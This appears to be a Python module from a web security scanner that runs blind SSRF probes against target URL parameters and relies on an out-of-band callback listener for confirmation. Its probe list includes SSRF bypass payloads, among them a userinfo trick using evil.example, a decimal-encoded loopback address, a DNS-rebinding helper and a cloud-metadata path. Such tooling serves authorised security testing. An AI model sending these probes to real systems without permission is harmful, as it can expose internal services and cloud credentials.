"""Blind SSRF probing with expanded bypass patterns.

Confirmation still happens on the user's out-of-band listener.
"""

from __future__ import annotations

from typing import List, Dict, Any, Tuple
from ..http_client import CurlClient


def build_probe_urls(callback_host: str) -> List[str]:
    host = callback_host.strip().rstrip("/")
    return [
        f"http://{host}/ssrf-test",
        f"https://{host}/ssrf-test",
        f"http://{host}@evil.example/",          # userinfo bypass
        f"//{host}",                             # protocol-relative
        f"http://127.0.0.1.nip.io/{host}",       # DNS rebinding style helper
        f"http://[::1]@{host}/",                 # IPv6-ish
        f"http://2130706433/",                   # decimal 127.0.0.1 (example)
        f"http://{host}/latest/meta-data/",      # cloud metadata flavour
    ]


def run(
    client: CurlClient,
    base_url: str,
    params: List[Tuple[str, str]],
    callback_host: str,
) -> List[Dict[str, Any]]:
    if not callback_host:
        return [{"error": "No --ssrf-callback host supplied; skipping SSRF probes.", "confidence": "info"}]

    findings = []
    probes = build_probe_urls(callback_host)

    for param, endpoint in params:
        full_endpoint = endpoint if endpoint.startswith("http") else f"{base_url.rstrip('/')}{endpoint}"
        for probe in probes:
            test_url = f"{full_endpoint}?{param}={probe}"
            resp = client.request(test_url)
            findings.append({
                "param": param,
                "endpoint": full_endpoint,
                "probe": probe,
                "status": resp.status_code if resp and not resp.error else None,
                "error": resp.error if resp and resp.error else None,
                "note": "Check your out-of-band listener for an inbound hit to confirm SSRF.",
                "confidence": "info",
                "issue": "SSRF probe sent",
            })
    return findings
